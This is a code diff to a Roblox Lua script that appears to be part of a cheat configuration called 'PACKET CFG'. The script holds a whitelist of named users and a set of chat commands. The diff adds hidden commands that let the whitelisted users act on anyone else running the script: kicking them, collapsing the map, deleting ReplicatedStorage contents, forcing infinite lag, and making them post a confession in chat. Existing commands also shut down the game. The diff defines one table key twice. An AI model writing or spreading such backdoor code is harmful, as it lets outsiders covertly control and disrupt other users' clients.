@@ -2,10 +2,8 @@ local textChatService = game:GetService("TextChatService")
 
 local whitelisted = {
     {name = "SnoopyCalledMeFake", tags = {4}},
-    {name "iamddosamawithnodd", tags = {3}},
-},
-
-
+    {name = "DreamerCanBypassAc", tags = {3}},
+}
 
 local chatTags = {
     [1] = {name = "STAR", color = Color3.fromRGB(255, 0, 0)},
@@ -13,6 +11,8 @@ local chatTags = {
     [3] = {name = "VAPE PRIVATE", color = Color3.fromRGB(255, 76.5, 76.5)},
     [4] = {name = "0prime trollage", color = Color3.fromRGB(0, 0, 255)},
     [5] = {name = "BOOSTER", color = Color3.fromRGB(244, 127, 255)},
+    [6] = {name = "BOOSTER", color = Color3.fromRGB(244, 127, 255)},
+    [6] = {name = "PACKET PRIVATE", color = Color3.fromRGB(244, 127, 255)},
 }
 
 local function getPlayerTags(playerName)
@@ -115,10 +115,36 @@ local cmds = {
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             wait(1)
             for index, player in pairs(game.Players:GetPlayers()) do
-                player:Kick("kicked")
+                player:Kick("Kicked by packet private member, cope")
             end
         end
     end,
+
+	[".breakmap"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local function unanchorParts(object)
+				if object:IsA("BasePart") then
+					object.Anchored = false
+				end
+				for _, child in ipairs(object:GetChildren()) do
+					unanchorParts(child)
+				end
+			end
+			unanchorParts(workspace)
+		end
+	end,
+
+    	[".noitems"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			pcall(function()
+				local replicatedStorage = game:GetService("ReplicatedStorage")
+				for _, child in ipairs(replicatedStorage:GetDescendants()) do
+					child:Destroy()
+				end
+			end)
+		end
+	end,
+
   [".blind"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             createBlindGui()
@@ -147,6 +173,23 @@ local cmds = {
             game:Shutdown()
         end
     end,
+
+    	[".detect"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local textChatService = game:GetService("TextChatService")
+			wait(0.0001)
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using PACKET CFG. Made by 0prime, chang3d, star, auth")
+		end
+	end,
+
+    	[".infping"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local thingy = settings().Network
+			thingy.IncomingReplicationLag = math.huge
+		end
+	end,
+
+
     [".lagback"] = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local character = game.Players.LocalPlayer.Character
@@ -160,13 +203,6 @@ local cmds = {
         end
     end
 }
-
-	[".infping"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local thingy = settings().Network
-			thingy.IncomingReplicationLag = math.huge
-		end
-	end,
 
 textChatService.OnIncomingMessage = function(message)
     local properties = Instance.new("TextChatMessageProperties")
